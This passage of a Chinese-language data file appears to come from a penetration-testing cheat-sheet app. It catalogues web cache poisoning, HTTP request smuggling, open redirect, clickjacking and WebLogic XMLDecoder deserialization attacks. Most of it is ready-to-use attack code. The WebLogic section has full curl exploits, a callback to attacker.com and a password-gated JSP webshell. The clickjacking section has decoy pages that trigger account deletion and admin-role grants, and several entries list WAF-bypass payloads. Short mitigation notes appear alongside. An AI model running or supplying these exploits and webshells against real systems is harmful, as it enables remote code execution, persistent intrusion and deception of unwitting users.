          { part: 'X-Cache', explanation: '缓存状态头', type: 'header' },
        ]
      },
      {
        title: '未键入头',
        command: `X-Forwarded-Host: attacker.com`,
        description: '注入未键入头',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'X-Forwarded-Host', explanation: '常被用作缓存键但未包含在键中', type: 'header' },
        ]
      },
      {
        title: '缓存投毒',
        command: `GET /?q=test HTTP/1.1\nHost: target.com\nX-Forwarded-Host: attacker.com`,
        description: '投毒缓存',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'attacker.com', explanation: '恶意主机，将被缓存', type: 'domain' },
        ]
      },
      {
        title: 'Fat GET',
        command: `GET / HTTP/1.1\nHost: target.com\nContent-Length: 10\n\nq=poisoned`,
        description: 'Fat GET投毒',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Content-Length', explanation: '包含请求体的GET请求', type: 'header' },
        ]
      },
    ],
    wafBypass: [
      {
        title: '未键入头部(Unkeyed Headers)利用',
        command: `# 常见未键入头:
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
X-Original-URL: /malicious
X-Forwarded-Prefix: /evil

# 发现未键入头:
# 使用Param Miner Burp扩展自动检测
# 手动对比: 添加头后响应是否变化但缓存键相同

# 投毒步骤:
# 1. 发送带恶意头的请求直到缓存命中
# 2. 验证其他用户访问同一URL时收到投毒响应`,
            syntaxBreakdown: [
              { part: '# 常见未键入头:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共11行', type: 'value' }
            ],
        description: '识别不包含在缓存键中但影响响应内容的HTTP头(如X-Forwarded-Host)，通过重复发送携带恶意头的请求将投毒响应存入缓存',
      },
      {
        title: '参数伪装与HTTP/2专属头投毒',
        command: `# 参数伪装(Parameter Cloaking):
# UTM参数通常不在缓存键中:
/page?utm_content=<script>alert(1)</script>
/page?callback=alert(1)&utm_source=x

# Fat GET投毒:
GET /api/data HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

q=<script>alert(1)</script>

# HTTP/2专属头:
:method: GET
:path: /
transfer-encoding: chunked`,
            syntaxBreakdown: [
              { part: '# 参数伪装(Parameter Cloaking):\n# UTM参数通常不在缓存键中:\n/page?utm_content=', explanation: '注入代码', type: 'value' },
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'alert(1)', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n/page?callback=alert(1)&utm_source=x\n\n# Fat GET投毒:\nGET /api/data HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nq=', explanation: '注入代码', type: 'value' },
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'alert(1)', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '\n\n# HTTP/2专属头:\n:method: GET\n:path: /\ntransfer-encoding: chunked', explanation: '注入代码', type: 'value' }
            ],
        description: '利用UTM等追踪参数不被缓存键包含的特性注入恶意内容，或使用Fat GET请求体覆盖查询参数，HTTP/2独有伪头触发差异化处理',
      },
    ],
    tutorial: {
      overview: 'Web缓存投毒是利用缓存服务器的缓存键(Cache Key)与实际响应内容不一致的漏洞，通过在非缓存键的HTTP头或参数中注入恶意内容，使缓存服务器存储包含恶意payload的响应，后续访问相同URL的所有用户都将收到被投毒的响应',
      vulnerability: '缓存投毒的根因在于缓存键通常只包含URL路径和少量参数，而Web应用可能会将非缓存键的HTTP头(如X-Forwarded-Host、X-Forwarded-Scheme)反射到响应中。当攻击者通过这些头注入恶意内容时，缓存服务器会将含有恶意内容的响应缓存并分发给所有用户',
      exploitation: '首先识别目标使用的缓存机制(通过Cache-Control、Age、X-Cache等响应头)，然后使用Param Miner等工具探测可被反射到响应中的非缓存键HTTP头，构造包含恶意JavaScript的头值(如X-Forwarded-Host: evil.com)，发送请求使缓存存储被投毒的响应，验证后续无恶意头的正常请求是否返回投毒内容',
      mitigation: '严格配置缓存键包含所有影响响应内容的参数和头部；对反射到响应中的HTTP头值进行严格的输入验证和编码；使用Vary头正确声明影响响应的HTTP头；配置缓存不缓存包含用户特定内容的响应；定期审计缓存配置和清除可疑缓存内容',
      difficulty: 'advanced'
    }
  },
  {
    id: 'smuggling-cl-te',
    name: 'CL-TE请求走私',
    description: 'Content-Length与Transfer-Encoding走私',
    category: '请求走私',
    subCategory: 'CL-TE',
    tags: ['smuggling', 'request', 'http'],
    prerequisites: ['目标使用多层代理', '前后端处理差异'],
    execution: [
      {
        title: 'CL-TE基础',
        command: `POST / HTTP/1.1\nHost: target.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED`,
        description: 'CL-TE走私',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Content-Length', explanation: '前端代理使用CL', type: 'header' },
          { part: 'Transfer-Encoding', explanation: '后端服务器使用TE', type: 'header' },
        ]
      },
      {
        title: 'TE-CL基础',
        command: `POST / HTTP/1.1\nHost: target.com\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0\n\n`,
        description: 'TE-CL走私',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Transfer-Encoding', explanation: '前端代理使用TE', type: 'header' },
          { part: 'Content-Length', explanation: '后端服务器使用CL', type: 'header' },
        ]
      },
      {
        title: 'TE-TE',
        command: `POST / HTTP/1.1\nHost: target.com\nTransfer-Encoding: chunked\nTransfer-Encoding: x\n\n0\n\nSMUGGLED`,
        description: 'TE-TE走私',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'Transfer-Encoding: x', explanation: '混淆TE头', type: 'header' },
        ]
      },
    ],
    wafBypass: [
      {
        title: 'TE头混淆变体',
        command: `# TE头混淆(使前/后端对TE解析不一致):
Transfer-Encoding: chunked

Transfer-Encoding : chunked

Transfer-Encoding: xchunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

X: x\nTransfer-Encoding: chunked

Transfer-Encoding\n: chunked`,
            syntaxBreakdown: [
              { part: '# TE头混淆(使前/后端对TE解析不一致):', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共9行', type: 'value' }
            ],
        description: '通过在Transfer-Encoding头中添加空格、制表符、换行符、多重头部、拼写变体等方式使前后端代理对该头的解析产生差异，触发请求走私',
      },
      {
        title: 'Chunked扩展字段与CL-TE组合利用',
        command: `# Chunked扩展字段(RFC允许的分号后扩展):
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0;ext="injected"

G

# CL-0走私:
POST / HTTP/1.1
Host: target.com
Content-Length: 0
Transfer-Encoding: chunked

GET /admin HTTP/1.1
Host: target.com

`,
            syntaxBreakdown: [
              { part: '# Chunked扩展字段(RFC允许的分号后扩展):', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共14行', type: 'value' }
            ],
        description: '利用HTTP Chunked编码的扩展字段(分号后内容)干扰解析，或通过CL-0技巧使前端认为请求无体而后端继续处理走私的第二个请求',
      },
    ],
    tutorial: {
      overview: 'HTTP请求走私(CL-TE类型)利用前端服务器(如反向代理)和后端服务器对Content-Length和Transfer-Encoding头的不同优先级解析，将一个恶意请求"走私"到另一个正常请求中，实现绕过安全控制、请求劫持、缓存投毒等攻击效果',
      vulnerability: 'HTTP/1.1规范允许Content-Length和Transfer-Encoding同时存在时，Transfer-Encoding优先。但不同服务器实现不一致：前端可能优先使用Content-Length确定请求边界，后端优先使用Transfer-Encoding。这种解析差异导致前端认为的一个请求在后端被拆分为两个请求',
      exploitation: '首先通过时序差异(Timing)技术探测是否存在CL-TE走私漏洞，构造包含Content-Length和Transfer-Encoding: chunked的请求，使前端按CL解析为一个完整请求转发，后端按TE解析后剩余部分成为下一个请求的前缀，然后利用走私的前缀实现请求劫持、绕过访问控制、窃取其他用户的请求数据',
      mitigation: '前后端统一使用HTTP/2协议避免解析歧义；配置前端代理规范化(Normalize)请求头，拒绝含有歧义头的请求；后端服务器配置拒绝同时包含Content-Length和Transfer-Encoding的请求；部署请求走私专用检测规则；使用端到端加密防止中间件篡改请求',
      difficulty: 'advanced'
    }
  },
  {
    id: 'redirect-basic',
    name: '基础开放重定向',
    description: 'URL跳转漏洞利用',
    category: '开放重定向',
    subCategory: '基础',
    tags: ['redirect', 'url', 'phishing'],
    prerequisites: ['目标参数控制跳转地址'],
    execution: [
      {
        title: '直接跳转',
        command: `http://target.com/redirect?url=http://attacker.com`,
        description: '直接跳转到攻击者站点',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'url=http://attacker.com', explanation: '指定跳转目标', type: 'parameter' },
        ]
      },
      {
        title: '绕过验证',
        command: `http://target.com/redirect?url=http://attacker.com@target.com`,
        description: '@符号绕过',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'attacker.com@target.com', explanation: '利用URL解析差异绕过', type: 'value' },
        ]
      },
      {
        title: '斜杠绕过',
        command: `http://target.com/redirect?url=//attacker.com`,
        description: '//绕过协议',
        platform: 'all',
        syntaxBreakdown: [
          { part: '//attacker.com', explanation: '协议相对URL', type: 'value' },
        ]
      },
    ],
    wafBypass: [
      {
        title: 'URL编码与双编码绕过',
        command: `# URL编码:
/redirect?url=%68%74%74%70%3a%2f%2fattacker.com
# 双编码:
/redirect?url=%2568%2574%2574%2570%253a%252f%252fattacker.com
# Unicode编码:
/redirect?url=http://attacker。com
/redirect?url=http://ⓐttacker.com
# CRLF注入:
/redirect?url=%0d%0aLocation:%20http://attacker.com`,
            syntaxBreakdown: [
              { part: '# URL编码:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共9行', type: 'value' }
            ],
        description: '通过URL编码、双重URL编码、Unicode同形字、CRLF注入等方式绕过跳转目标地址的白名单或黑名单检测',
      },
      {
        title: '反斜杠与data: URI绕过',
        command: `# 反斜杠技巧:
/redirect?url=http://attacker.com\@target.com
/redirect?url=\/\/attacker.com
/redirect?url=\/attacker.com

# data: URI:
/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# 协议相对URL变体:
/redirect?url=//attacker.com
/redirect?url=///attacker.com
/redirect?url=////attacker.com`,
            syntaxBreakdown: [
              { part: '# 反斜杠技巧:', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共10行', type: 'value' }
            ],
        description: '利用反斜杠在不同解析器中的差异行为、data: URI协议、多斜杠协议相对URL等方式绕过域名白名单验证',
      },
    ],
    tutorial: {
      overview: '开放重定向漏洞允许攻击者通过篡改URL参数将用户从受信任的域名重定向到任意外部恶意网站，常被用于钓鱼攻击(利用受信任域名的可信度)、OAuth令牌窃取、绕过SSRF防护等场景，是社会工程学攻击的重要辅助手段',
      vulnerability: '应用程序在处理重定向URL参数(如redirect_url、return_to、next等)时未对目标URL进行严格的白名单校验，仅做简单的域名包含检查(如检查是否包含trusted.com字符串)，可被攻击者通过URL编码、添加子域名(trusted.com.evil.com)、使用@符号(trusted.com@evil.com)等方式绕过',
      exploitation: '首先识别应用中所有重定向参数(通过爬虫、JS分析、登录/注销流程)，测试将重定向目标改为外部域名，如果被拦截则尝试绕过手法：双重URL编码、使用协议相对URL(//evil.com)、利用@符号(https://trusted.com@evil.com)、添加受信域名为子域(https://evil.com/trusted.com)、使用反斜杠(https://trusted.com\\@evil.com)等',
      mitigation: '实施严格的白名单校验，仅允许重定向到预定义的可信域名列表；使用相对路径而非完整URL进行站内重定向；对重定向URL参数进行签名防篡改；在重定向前向用户显示中间确认页面；Content Security Policy(CSP)配置navigate-to指令限制可导航域名',
      difficulty: 'beginner'
    }
  },
  {
    id: 'clickjacking-basic',
    name: '基础点击劫持',
    description: '通过透明iframe覆盖诱使用户在不知情的情况下点击隐藏的恶意按钮或链接',
    category: '点击劫持',
    subCategory: '基础',
    tags: ['clickjacking', 'ui-redressing', 'iframe'],
    prerequisites: ['目标站点允许被iframe嵌套', '目标未设置X-Frame-Options响应头', '目标未配置CSP frame-ancestors策略', 'HTML/CSS基础知识'],
    execution: [
      {
        title: '检测X-Frame-Options和CSP',
        command: `curl -sI "http://target.com" | grep -iE "x-frame-options|content-security-policy|frame-ancestors"

# 批量检测:
for url in $(cat urls.txt); do
  echo -n "$url: "
  xfo=$(curl -sI "$url" | grep -i "x-frame-options")
  csp=$(curl -sI "$url" | grep -i "frame-ancestors")
  [ -z "$xfo" ] && [ -z "$csp" ] && echo "VULNERABLE" || echo "Protected: $xfo $csp"
done`,
        description: '检查目标是否设置了防点击劫持的安全头',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'curl -sI', explanation: '静默模式仅获取HTTP响应头', type: 'command' },
          { part: 'grep -iE', explanation: '不区分大小写的扩展正则匹配', type: 'command' },
          { part: 'x-frame-options', explanation: '防止页面被iframe嵌套的安全头', type: 'value' },
          { part: 'frame-ancestors', explanation: 'CSP指令，控制哪些源可以嵌套本页', type: 'value' },
        ]
      },
      {
        title: '基础透明iframe覆盖POC',
        command: `<html>
<head><title>Win a Prize!</title>
<style>
  #target-frame {
    position: absolute; top: 0; left: 0;
    width: 500px; height: 500px;
    opacity: 0.0001; /* 近乎完全透明 */
    z-index: 2; border: none;
  }
  #decoy-btn {
    position: absolute; top: 120px; left: 50px;
    z-index: 1; padding: 15px 30px;
    font-size: 20px; cursor: pointer;
    background: #4CAF50; color: white;
    border: none; border-radius: 5px;
  }
</style></head>
<body>
  <h1>Congratulations! You Won!</h1>
  <p>Click the button to claim your prize:</p>
  <button id="decoy-btn">Claim Prize</button>
  <iframe id="target-frame" src="http://target.com/account/delete"></iframe>
</body></html>`,
        description: '构造诱饵页面，将目标敏感操作页面以透明iframe覆盖在诱饵按钮上方',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'opacity: 0.0001', explanation: '设置iframe几乎完全透明，用户无法看到', type: 'value' },
          { part: 'z-index: 2', explanation: '确保iframe层级在诱饵按钮之上', type: 'value' },
          { part: 'position: absolute', explanation: '绝对定位使iframe和按钮可以精确重叠', type: 'value' },
          { part: '/account/delete', explanation: '目标站点的敏感操作URL(如删除账户、转账等)', type: 'value' },
        ]
      },
      {
        title: '多步骤拖拽劫持(Drag-and-Drop)',
        command: `<html>
<head><style>
  #source { width:200px; height:50px; background:#eee; text-align:center; line-height:50px; }
  #target-frame { position:absolute; top:0; left:0; width:600px; height:400px; opacity:0.0001; z-index:10; }
</style>
<script>
  // 监听拖拽事件，可以跨域提取数据
  document.addEventListener("drag", function(e) {
    console.log("Dragging:", e.dataTransfer.getData("text"));
  });
</script></head>
<body>
  <div id="source" draggable="true">Drag this to win!</div>
  <div id="drop-zone" style="width:200px;height:200px;border:2px dashed #ccc;margin-top:20px;">Drop Here</div>
  <iframe id="target-frame" src="http://target.com/profile" sandbox="allow-scripts allow-forms"></iframe>
</body></html>`,
        description: '利用HTML5拖拽API实现跨域数据提取型点击劫持',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'draggable="true"', explanation: '使元素可被拖拽', type: 'value' },
          { part: 'dataTransfer.getData', explanation: '从拖拽操作中提取数据', type: 'command' },
          { part: 'sandbox="allow-scripts allow-forms"', explanation: '限制iframe权限的同时允许脚本和表单', type: 'value' },
        ]
      },
      {
        title: '利用CSS pointer-events绕过',
        command: `<style>
  .overlay { pointer-events: none; position: absolute; z-index: 100; }
  iframe { pointer-events: auto; position: absolute; opacity: 0; }
</style>
<div class="overlay">
  <h1>Survey: Rate Our Service</h1>
  <p>Select your rating below:</p>
  <!-- 诱饵内容完全不拦截鼠标事件 -->
  <div style="display:flex; gap:20px; margin-top:50px;">
    <span style="font-size:40px">⭐</span>
    <span style="font-size:40px">⭐⭐</span>
    <span style="font-size:40px">⭐⭐⭐</span>
  </div>
</div>
<iframe src="http://target.com/admin/grant-role?role=admin&user=attacker" style="width:100%;height:100%;border:none;"></iframe>`,
        description: '使用pointer-events:none使覆盖层不拦截点击，点击直接穿透到下层iframe',
        platform: 'all',
        syntaxBreakdown: [
          { part: 'pointer-events: none', explanation: '使元素不响应鼠标事件，点击穿透到下层', type: 'value' },
          { part: 'pointer-events: auto', explanation: 'iframe保持正常响应鼠标事件', type: 'value' },
        ]
      },
    ],
    tutorial: {
      overview: '点击劫持(Clickjacking/UI Redressing)是一种视觉欺骗攻击，攻击者通过透明的iframe覆盖在诱饵页面上，诱使用户在不知情的情况下点击隐藏在iframe中的敏感操作按钮。攻击可以导致账户删除、转账、授权等危险操作。',
      vulnerability: '目标网站未设置X-Frame-Options响应头(DENY/SAMEORIGIN)，也未配置Content-Security-Policy的frame-ancestors指令，允许任意第三方页面通过iframe嵌套加载。',
      exploitation: '利用流程：1) 检测目标是否允许iframe嵌套 2) 定位目标站点的敏感操作页面(如删除、转账、修改权限) 3) 构造诱饵页面，将目标页面以透明iframe覆盖 4) 精确对齐iframe中的目标按钮与诱饵按钮位置 5) 诱使受害者访问诱饵页面并点击',
      mitigation: '1) 设置X-Frame-Options: DENY或SAMEORIGIN 2) 配置CSP: frame-ancestors \'self\' 3) 对敏感操作添加二次确认 4) 使用SameSite Cookie属性 5) JavaScript frame-busting脚本(作为兜底)',
      difficulty: 'beginner'
    },
      wafBypass: [
        { 
          title: 'iframe sandbox属性绕过', 
          command: `<iframe src="https://target.com" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>

<!-- 利用sandbox allow-top-navigation绕过 -->
<iframe src="https://target.com" sandbox="allow-scripts allow-top-navigation allow-forms"></iframe>

<!-- 利用sandbox+srcdoc绕过 -->
<iframe srcdoc="<script>top.location='https://target.com'</script>" sandbox="allow-scripts allow-top-navigation"></iframe>`,
          description: '通过iframe sandbox属性的allow-top-navigation和allow-scripts组合绕过部分frame-busting脚本' 
        },
        { 
          title: 'X-Frame-Options ALLOW-FROM不一致', 
          command: `<!-- 利用浏览器对ALLOW-FROM支持不一致 -->
<!-- Chrome/Safari忽略ALLOW-FROM，仅CSP frame-ancestors生效 -->

<!-- 双重iframe绕过frame-busting -->
<iframe src="data:text/html,<iframe src='https://target.com'></iframe>"></iframe>

<!-- 利用window.name绕过 -->
<iframe src="attacker-page.html" name="payload_data"></iframe>`,
          description: 'X-Frame-Options ALLOW-FROM在不同浏览器中表现不一致，Chrome/Safari完全忽略此指令' 
        },
        { 
          title: '双重嵌套iframe绕过', 
          command: `<!-- 双重嵌套绕过frame-busting -->
<iframe src="middle-page.html"></iframe>

<!-- middle-page.html内容 -->
<html><body>
<iframe src="https://target.com" sandbox="allow-forms"></iframe>
</body></html>

<!-- onbeforeunload阻止跳转 -->
<script>window.onbeforeunload=function(){return "x";}</script>
<iframe src="https://target.com"></iframe>`,
            syntaxBreakdown: [
              { part: '<!-- 双重嵌套绕过frame-busting -->', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<iframe src="middle-page.html">', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '</iframe>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<!-- middle-page.html内容 -->', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<html>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<body>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<iframe src="https://target.com" sandbox="allow-forms">', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '</iframe>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '</body>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '</html>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<!-- onbeforeunload阻止跳转 -->', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: 'window.onbeforeunload=function(){return "x";}', explanation: '注入代码', type: 'value' },
              { part: '</script>', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '<iframe src="https://target.com">', explanation: 'HTML标签/事件处理器', type: 'tag' },
              { part: '</iframe>', explanation: 'HTML标签/事件处理器', type: 'tag' }
            ],
          description: '通过双重嵌套iframe使frame-busting脚本中的top引用指向中间页而非攻击页' 
        }
      ]
    },
  {
    id: 'weblogic-xmldecoder',
    name: 'WebLogic XMLDecoder',
    description: '利用WebLogic Server中XMLDecoder反序列化漏洞(CVE-2017-10271/CVE-2017-3506)实现远程代码执行',
    category: '框架漏洞',
    subCategory: 'WebLogic',
    tags: ['weblogic', 'xmldecoder', 'rce'],
    prerequisites: ['目标运行WebLogic Server', '存在/wls-wsat/或/_async/路径', 'XMLDecoder组件未被禁用', 'WebLogic版本存在漏洞(10.3.6.0/12.1.3.0等)'],
    execution: [
      {
        title: '探测WebLogic版本和路径',
        command: `# 检测WebLogic控制台
curl -sI "http://target:7001/console/" | head -5

# 检测wls-wsat端点(CVE-2017-10271)
curl -s "http://target:7001/wls-wsat/CoordinatorPortType" | head -20

# 检测AsyncResponseService端点(CVE-2019-2725)
curl -s "http://target:7001/_async/AsyncResponseService" | head -20

# 检测T3协议
nmap -sV -p 7001 --script weblogic-t3-info target`,
        description: '探测WebLogic服务器版本、开放端口和可利用的端点',
        platform: 'linux',
        syntaxBreakdown: [
          { part: '/wls-wsat/CoordinatorPortType', explanation: 'WebLogic WLS-WSAT组件端点，CVE-2017-10271利用点', type: 'value' },
          { part: '/_async/AsyncResponseService', explanation: 'WebLogic异步通信服务端点，CVE-2019-2725利用点', type: 'value' },
          { part: 'weblogic-t3-info', explanation: 'Nmap脚本检测T3协议信息', type: 'value' },
        ]
      },
      {
        title: 'CVE-2017-10271 XMLDecoder RCE',
        command: `curl -v "http://target:7001/wls-wsat/CoordinatorPortType" \
  -H "Content-Type: text/xml" \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>id > /tmp/test_rce.txt</string></void>
          </array>
          <void method="start"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'`,
        description: '通过SOAP请求中的WorkContext注入XMLDecoder反序列化payload实现命令执行',
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'soapenv:Envelope', explanation: 'SOAP消息的根元素', type: 'value' },
          { part: 'work:WorkContext', explanation: 'WebLogic工作上下文，XMLDecoder解析入口', type: 'value' },
          { part: 'java.beans.XMLDecoder', explanation: 'Java XML反序列化器，漏洞的核心组件', type: 'value' },
          { part: 'java.lang.ProcessBuilder', explanation: '用于创建操作系统进程执行命令', type: 'value' },
          { part: 'void method="start"', explanation: '调用ProcessBuilder.start()执行构造的命令', type: 'command' },
        ]
      },
      {
        title: 'CVE-2019-2725 反序列化RCE',
        command: `curl -v "http://target:7001/_async/AsyncResponseService" \
  -H "Content-Type: text/xml" \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
  <soapenv:Header>
    <wsa:Action>xx</wsa:Action>
    <wsa:RelatesTo>xx</wsa:RelatesTo>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
          <void index="0"><string>/bin/bash</string></void>
          <void index="1"><string>-c</string></void>
          <void index="2"><string>curl http://attacker.com/callback?rce=success</string></void>
        </array>
        <void method="start"/>
      </void>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body><asy:onAsyncDelivery/></soapenv:Body>
</soapenv:Envelope>'`,
        description: '利用_async端点的反序列化漏洞执行外带验证(OOB)',
        platform: 'linux',
        syntaxBreakdown: [
          { part: '/_async/AsyncResponseService', explanation: '异步服务端点，CVE-2019-2725的攻击入口', type: 'value' },
          { part: 'wsa:Action', explanation: 'WS-Addressing Action头，触发异步处理', type: 'value' },
          { part: 'curl http://attacker.com/callback', explanation: '使用curl外带验证命令执行结果', type: 'command' },
        ]
      },
      {
        title: '写入Webshell获取持久权限',
        command: `# 通过XMLDecoder写入JSP Webshell
curl "http://target:7001/wls-wsat/CoordinatorPortType" \
  -H "Content-Type: text/xml" \
  -d '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.8.0" class="java.beans.XMLDecoder">
        <void class="java.io.PrintWriter">
          <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
          <void method="println">
            <string><![CDATA[<%if("test".equals(request.getParameter("pwd"))){java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a=-1;byte[]b=new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}}%>]]></string>
          </void>
          <void method="close"/>
        </void>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>'

# 验证Webshell
curl "http://target:7001/bea_wls_internal/test.jsp?pwd=test&cmd=id"`,
        description: '利用XMLDecoder的PrintWriter写入JSP webshell到WebLogic部署目录',
        platform: 'linux',
        requiresAdmin: false,
        syntaxBreakdown: [
          { part: 'java.io.PrintWriter', explanation: '利用PrintWriter类写入文件', type: 'value' },
          { part: 'servers/AdminServer/tmp/_WL_internal/...', explanation: 'WebLogic内部Web应用部署路径', type: 'value' },
          { part: 'CDATA', explanation: 'XML CDATA区段，避免JSP代码被XML解析器处理', type: 'value' },
          { part: '/bea_wls_internal/test.jsp', explanation: 'Webshell的访问URL路径', type: 'value' },
        ]
      },
    ],
    tutorial: {
      overview: 'WebLogic XMLDecoder反序列化是一系列严重的RCE漏洞(CVE-2017-3506/CVE-2017-10271/CVE-2019-2725)，攻击者通过向WLS-WSAT或AsyncResponseService端点发送精心构造的SOAP XML请求，利用XMLDecoder对WorkContext的反序列化过程执行任意Java代码，从而实现远程命令执行。',
      vulnerability: 'WebLogic的WLS-WSAT和异步通信服务在处理SOAP请求时，使用XMLDecoder解析WorkContext中的XML数据。由于XMLDecoder可以实例化任意Java类并调用其方法，攻击者可以构造恶意XML来创建ProcessBuilder或Runtime实例执行操作系统命令。',
      exploitation: '利用流程：1) 探测目标WebLogic版本和开放端点(/wls-wsat/, /_async/) 2) 构造SOAP XML请求，在WorkContext中嵌入XMLDecoder payload 3) 利用ProcessBuilder执行系统命令验证RCE 4) 通过PrintWriter写入Webshell获取持久权限 5) 利用Webshell执行后续操作',
      mitigation: '1) 升级到最新补丁版本 2) 删除或限制/wls-wsat/和/_async/端点的访问 3) 使用WAF过滤SOAP请求中的恶意XML 4) 限制WebLogic运行权限 5) 监控异常的SOAP请求和文件写入操作',
      difficulty: 'intermediate'
    },
      wafBypass: [
        { 
          title: '备用反序列化端点', 
          command: `# 尝试不同的XMLDecoder入口
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/CoordinatorPortType11
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/ParticipantPortType
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/RegistrationPortTypeRPC
curl -H "Content-Type: text/xml" -d @payload.xml http://target:7001/wls-wsat/RegistrationRequesterPortType`,
            syntaxBreakdown: [
              { part: '# 尝试不同的XMLDecoder入口', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共6行', type: 'value' }
            ],
          description: '尝试WebLogic WLS-WSAT组件的多个不同SOAP端点，部分端点可能未被WAF规则覆盖' 
        },
        { 
          title: 'T3/IIOP协议绕过HTTP层WAF', 
          command: `# T3协议利用（绕过HTTP层WAF）
python3 weblogic_t3_exploit.py -t target:7001 -c "id"

# IIOP协议利用
python3 weblogic_iiop_exploit.py -t target:7001 -c "whoami"

# 使用ysoserial生成T3 payload
java -jar ysoserial.jar CommonsCollections1 "touch /tmp/test" | python3 t3_send.py target 7001`,
            syntaxBreakdown: [
              { part: '# T3协议利用（绕过HTTP层WAF）', explanation: '主要命令', type: 'command' },
              { part: '...', explanation: '共6行', type: 'value' }
            ],
          description: '使用T3或IIOP协议发送反序列化payload，绕过仅检测HTTP流量的WAF' 
        },
        { 
          title: 'XML编码混淆绕过', 
          command: `<!-- UTF-16编码绕过 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- CDATA包裹关键字 -->
<java>
  <object class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0"><string><![CDATA[/bin/sh]]></string></void>
      <void index="1"><string><![CDATA[-c]]></string></void>
      <void index="2"><string><![CDATA[id]]></string></void>
    </array>
    <void method="start"/>
  </object>
</java>`,
            syntaxBreakdown: [
              { part: '<!-- UTF-16编码绕过 -->\n', explanation: 'XML内容', type: 'value' },
              { part: '<?xml version="1.0" encoding="UTF-16"?>', explanation: 'XML声明/实体定义', type: 'tag' },
              { part: '\n\n<!-- CDATA包裹关键字 -->\n<java>\n  <object class="java.lang.Proc', explanation: 'XML内容', type: 'value' }
            ],
          description: '通过XML编码（UTF-16/CDATA/实体编码）混淆payload内容绕过基于内容匹配的WAF' 
        }
      ]
    },
  {
    id: 'auth-brute',
    name: '暴力破解',
    description: '自动化密码猜测攻击',
    category: '认证漏洞',
    subCategory: '暴力破解',
    tags: ['auth', 'brute-force', 'password'],
    prerequisites: ['无验证码', '无锁定策略'],
    execution: [
      {
        title: 'Pitchfork',
        command: `Burp Intruder: Pitchfork模式`,
